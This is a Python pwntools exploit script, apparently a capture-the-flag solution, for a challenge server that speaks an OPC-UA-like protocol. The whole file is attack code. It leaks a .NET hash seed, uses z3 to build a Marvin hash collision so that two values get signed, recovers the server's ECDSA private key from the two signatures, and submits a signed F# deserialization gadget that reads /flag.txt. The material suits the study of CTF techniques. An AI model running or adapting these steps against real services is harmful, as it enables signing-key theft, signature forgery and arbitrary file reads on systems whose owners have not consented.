#!/usr/bin/env python3
import json

from pwn import *
from z3 import *
import binascii
import os

HOST = 'npc-ua.shellweplayaga.me'
PORT = '4840'
TICKET = os.environ.get('TICKET')

context.log_level = 'debug'

# Define reverse function
def ReverseBlock(rp0, rp1):
    # Undo last step of Block
    num2 = RotateRight(rp1, 19)
    num = rp0 - num2

    # Undo second last step of Block
    num2 = num2 ^ num
    num = RotateRight(num, 27)

    # Undo first step of Block
    num2 = RotateRight(num2, 9)
    num -= num2
    num = RotateRight(num, 20)
    num2 ^= num

    return (num, num2)

def Block(p0, p1):
    p1 ^= p0
    p0 = RotateLeft(p0, 20)
    p0 += p1
    p1 = RotateLeft(p1, 9)
    p1 ^= p0
    p0 = RotateLeft(p0, 27)
    p0 += p1
    p1 = RotateLeft(p1, 19)
    return p0, p1

class CollisionFinder(object):
    def __init__(self, seed):
        self.solver = Solver()
        self.start_val = 0
        self.s0 = BitVecVal(seed & 0xffffffff, 32)
        self.s1 = BitVecVal(seed >> 32, 32)
        #self.s1 = BitVec('s1', 32)

    def finalize(self, p0,p1):
        p0 += 0x80
        p0,p1 = Block(p0, p1)
        p0,p1 = Block(p0, p1)
        return p0,p1

    def do_block(self, p0, p1, v):
        p0 = p0 + v 
        return Block(p0, p1)

    def do_hash(self, vals):
        assert(len(vals) % 2 == 0)

        self.start_val = p32(vals[0]) + p32(vals[1])

        val3 = BitVec('v3', 32)
        val4 = BitVec('v4', 32)
        val5 = BitVec('v5', 32)
        val6 = BitVec('v6', 32)

        p0 = self.s0
        p1 = self.s1

        for i in range(0, len(vals)):
            p0,p1 = self.do_block(p0,p1, vals[i])

        # Prepair for extention
        q0,q1 = p0,p1

        p0,p1 = self.finalize(p0,p1)

        q0,q1 = self.do_block(q0,q1, val3)
        q0,q1 = self.do_block(q0,q1, val4)
        q0,q1 = self.do_block(q0,q1, val5)
        q0,q1 = self.do_block(q0,q1, val6)
        q0,q1 = self.finalize(q0,q1)

        #h  = BitVec('h', 32)
        self.solver.add((p0^p1) == (q0^q1))
        #self.solver.add((val4&0x00ff0000) == BitVecVal(0x00220000, 32))
        self.solver.add((val6&0xffff0000) == BitVecVal(0x00220000, 32))
        #self.solver.add((p0^p1) == h)

        #o0 = BitVec('o0', 32)
        #o1 = BitVec('o1', 32)
        #self.solver.add(o0 == p0)
        #self.solver.add(o1 == p1)

        #q0 = q0 + vals[i+1]
        #q0,q1 = Block(q0, q1)
        #q0,q1 = self.finalize(q0,q1)



        return p0,p1

    def solve(self):
        s = self.solver
        if s.check() == sat:
            m = s.model()
            print("Solution found:")
            print(m)
            vals = {str(k):m[k] for k in m}
            for k,v in vals.items():
                print(f'{k}={hex(v.as_long())}')
            v3 = vals['v3'].as_long()
            v4 = vals['v4'].as_long()
            v5 = vals['v5'].as_long()
            v6 = vals['v6'].as_long()
            #s = p64(0x4847464544430022)
            s = self.start_val
            with open('coldata1.bin','wb') as f:
                f.write(s)
            s += p32(v3)
            s += p32(v4)
            s += p32(v5)
            s += p32(v6)
            print(binascii.hexlify(s))
            with open('coldata2.bin','wb') as f:
                f.write(s)
            return s
        else:
            print("No solution")

#p = process('./run.sh')
p = remote(HOST, PORT)

if TICKET:
    p.readuntil(b'Ticket please')
    p.sendline(TICKET.encode('latin-1'))

def pstr(s):
    return p32(len(s)) + s

def send_msg(name, data):
    m = name + b'\0'
    m += p32(len(data) + 8)
    m += data
    p.send(m)


def send_hello():
    m = p32(1337)
    m += p32(0x1000)
    m += p32(0x1000)
    m += p32(0x1000)
    m += p32(1)
    m += pstr(b'npc://main')
    send_msg(b'HEL', m)

def send_sec_msg(name, data):
    m = p32(0)
    m += pstr(b"http://nautilus.npc/UA/SecurityPolicy#None")
    m += p32(0) # pub key len
    m += p32(0) # token len
    m += p32(0) # seq 0
    m += p32(0) # seq 1
    m += data
    send_msg(name, m)

pub_key = None

def send_service_req(num, data):
    global pub_key
    m = p32(0)
    m += p32(0) # namespaces
    m += p32(0) # servier uris
    m += p32(0) # locales
    m += p32(num) # service id

    '''
    # request header
    m += p32(4) # auth token
    m += p64(0) # timestamp
    m += p32(0) # request handle
    m += p32(0) # return diag
    m += p32(0) # audit_entry_id
    m += p32(0) # timeout hint
    m += p32(1) # additional header
    '''

    m += data


    send_sec_msg(b'MSG', m)

    if pub_key is None:
        pub_key = b'-----BEGIN PUBLIC KEY-----'
        print(p.readuntil(pub_key))
        pub_key += p.readuntil(b'-----END PUBLIC KEY-----')
        print("!!! PUB KEY", repr(pub_key))

        with open('public.ec.pem', 'wb') as f:
            f.write(pub_key)

    print(p.readuntil(b'{"responseHeader"').decode('latin-1'))
    js = '{"repsonseHeader"' + p.readuntil(b'"diagnosticInfos":[]}').decode('utf-8')
    print(js)
    return json.loads(js)


def read_node(name):
    m = p32(0)
    m += p32(0)

    m += p32(1) # Node array

    m += p32(1) # node id
    m += pstr(name)
    m += p32(13) # attr_id = value
    m += p32(0) # null range
    m += p32(0)
    m += pstr(b'Default Binary')

    send_service_req(629, m)

# Target data to collide with
data_1 = b'\x22\x00\x43\x44\x45\x46\x22\x00'

# npc://System/Environment/Version

# + Leak dotnet hash seed
res = send_service_req(629, json.dumps(
    dict(
        requestHeader=dict(
            timestamp= 0,
            requestHandle= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToRead= [dict(
            #nodeId = "npc://System/Environment/Version",
            nodeId = "npc://System/Marvin/DefaultSeed",
            attributeId = 13,
        )],
    )
).encode('utf-8'))

seed = json.loads(res['results'][0]['value']['data'])
seed = int(seed)
print('~~~~~~~~~~~~ SEED',hex(seed))
input()

# + Write first target data
res = send_service_req(630, json.dumps(
    dict(
        requestHeader=dict(
            timestamp= 0,
            requestHandle= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToWrite= [dict(
            nodeId = "npc://variable/version",
            attributeId = 13,
            value = data_1.decode('utf-16')[1:-1],
        )],
    )
).encode('utf-8'))
assert(res['repsonseHeader']['serviceResult'] == 0)

# + Get signature of first target data
res = send_service_req(629, json.dumps(
    dict(
        requestHeader=dict(
            timestamp= 0,
            requestHandle= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToRead= [dict(
            nodeId = "npc://variable/version",
            attributeId = 13,
        )],
    )
).encode('utf-8'))

signed_data_1 = res['results'][0]['value']

#p.interactive()
#print(p.readuntil(b'"data":"\\"').decode('latin-1'))

input()

#time.sleep(5)

# + Find a collision for the dotnet hash seed that collides with data_1
print(f'~~~~~~~~~ Finding collision with {binascii.hexlify(data_1)}')
cf = CollisionFinder(int(seed))
cf.do_hash([0x44430022, 0x00224645])
data2 = cf.solve()

print(f'!!!!!!!!!! collision found: {binascii.hexlify(data2)}')

# + Write the collision to get it signed
send_service_req(630, json.dumps(
    dict(
        requestHeader=dict(
            timestamp= 0,
            requestHandle= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToWrite= [dict(
            nodeId = "npc://variable/version",
            attributeId = 13,
            value = data2.decode('utf-16')[1:-1],
        )],
    )
).encode('utf-8'))

# + Read the collision to get second sig
res = send_service_req(629, json.dumps(
    dict(
        requestHeader=dict(
            timestamp= 0,
            requestHandle= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToRead= [dict(
            nodeId = "npc://variable/version",
            attributeId = 13,
        )],
    )
).encode('utf-8'))

signed_data_2 = res['results'][0]['value']

print("@@@@@@@@@@@@@ COLLISION FOUND @@@@@@@@@@@@@")
print(signed_data_1['signature'])
print(signed_data_2['signature'])

input('Hit enter')

# + Recover private key
o = subprocess.check_output([
    'sage','./recover_key.py',
    signed_data_1['signature'], signed_data_2['signature']
])
print(o.decode('latin-1'))
with open('recovered_private.ec.pem','r') as f:
    print(f.read())
input("press enter")

# + Create fsharp serialized payload which reads the flag
payload = '{"_flags":"subtype","subtype":{"Case":"NamedType","Name":"NPCUA+loadPublicKey@435","Assembly":{"Name":"npcua.nautilus","Version":"1.0.0.0","Culture":"neutral","PublicKeyToken":""}},"instance":{"pubkeypath":"/flag.txt"}}'
with open('payload.bin', 'wb') as f:
    f.write(payload.encode('utf-16')[2:])

# + Sign the payload
o = subprocess.check_output([
    'sage','./generate_payload.py',
])

print(o.decode('latin-1'))

with open('payload.sig','r') as f:
    sig = f.read().strip()
    print('SIG',sig)

input("enter")

ser = dict(data=payload, signature=sig)

res = send_service_req(632, json.dumps(
    dict(
        requestHeader=dict(
            timestamp= 0,
            requestHandle= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToImport= [ser],
    )
).encode('utf-8'))



p.interactive()

# + Send the payload to get the flag
send_service_req(631, json.dumps(
    dict(
        requestHeader=dict(
            #authToken= '',
            timestamp= 0,
            requestHandle= 0,
            #returnDiagnostics= 0,
            #auditEntryId= '',
            #timeoutHint= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToExport= [],
    )
).encode('utf-8'))

send_service_req(629, json.dumps(
    dict(
        requestHeader=dict(
            #authToken= '',
            timestamp= 0,
            requestHandle= 0,
            #returnDiagnostics= 0,
            #auditEntryId= '',
            #timeoutHint= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToRead= [],
        data=data2.decode('utf-16'),
    )
).encode('utf-8'))

send_service_req(631, json.dumps(
    dict(
        requestHeader=dict(
            #authToken= '',
            timestamp= 0,
            requestHandle= 0,
            #returnDiagnostics= 0,
            #auditEntryId= '',
            #timeoutHint= 0,
        ),
        maxAge= 0,
        timestampsToReturn= 0,
        nodesToExport= [],
    )
).encode('utf-8'))

#p.interactive()



